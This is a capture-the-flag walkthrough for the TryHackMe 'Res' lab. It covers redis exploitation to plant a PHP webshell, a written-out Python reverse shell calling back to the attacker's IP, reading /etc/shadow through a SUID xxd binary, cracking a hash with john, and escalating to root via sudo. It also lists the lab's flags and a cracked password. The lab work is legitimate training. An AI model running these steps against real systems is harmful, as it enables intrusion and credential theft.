
# Res - vulnerable database server

Link to the room : https://tryhackme.com/room/res

My IP address : 10.8.202.86

Target IP address : 10.10.142.184

My OS : Kali GNU/Linux 2021.2

## Enumeration

First off we need to enumerate our target.
```
sudo nmap -sSVC -p- -n -T4 -A 10.10.142.184

PORT    STATE   SERVICE and VERSION
80      open    http Apache/2.4.18
6379    open    redis 6.0.7
```

Next up I moved to the webpage but didn't really find anything that could help me get into the machine. So I googled some information about redis database and found out that 
I can connect to this database with a special tool called `redis-cli`. 
```
sudo apt install redis-cli
redis-cli 10.10.142.184
```
And with that access we are able to obtain a webshell that we will turn into a reverse shell.

## Webshell

To obtain a webshell we have to move into our webpage directory (default /var/www/html) and write a new file that we'll access through our browser. The file will give us 
possibility to execute various cmd commands.
```
config set dir /var/www/html
config set dbfilename webshell.php
set test "<?php system($_GET['cmd']); ?>"
save
```
All of this you can read on the forum HackTricks : https://book.hacktricks.xyz/pentesting/6379-pentesting-redis .

As we are done with our webshell we can try to run it from the webpage by going into http://10.10.142.184/webshell.php?cmd= and passing and argument into `cmd` parameter.
You can try to check if it works by passing `id` or `whoami`. 

## Reverse shell

Now we can start listening with netcat and pass a python3 reverse shell to execute it.
```
nc -lnvp 445

?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.202.86",445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
It shouldn't take long to get the connection.

## Stabilisation and horizontal privilege escalation

You can stabilise your reverse shell using python3 `python3 -c 'import pty; pty.spawn("/bin/bash")'`. 

After that we can start enumerating this machine and search for potential vectors that will help us escalate our privileges. After a while of manual searching I did search for 
all SUID files and one of them was particularly interesting.
```
find / -user root -perm /4000 > /tmp/find.txt
cat /tmp/find.txt

/usr/bin/xxd
```
It's not something I was familiar with and definitely it is not basic tool that comes with Linux so I looked it up on https://gtfobins.github.io/ and to my suprise I was able 
to use it to read all of the files on system. First thing that you should always check is /etc/shadow were I was able to retrieve vianka's hash.
```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA1 viankahash.txt

vianka:beautiful1
```
There is no SSH service so you have to `su vianka` from your reverse shell. 

## Vertical privilege escalation

With vianka's account first thing that I did was reading user.txt file `thm{red1s_rce_w1thout_credent1als}` and checking `sudo -l`. And again, to my surprise, the privilege 
escalation was easy because vianka has permission to run ALL files with `sudo`. 
```
sudo -l
sudo /bin/sh
whoami

root
```
The root.txt file was in /root/ directory `thm{xxd_pr1v_escalat1on}`.
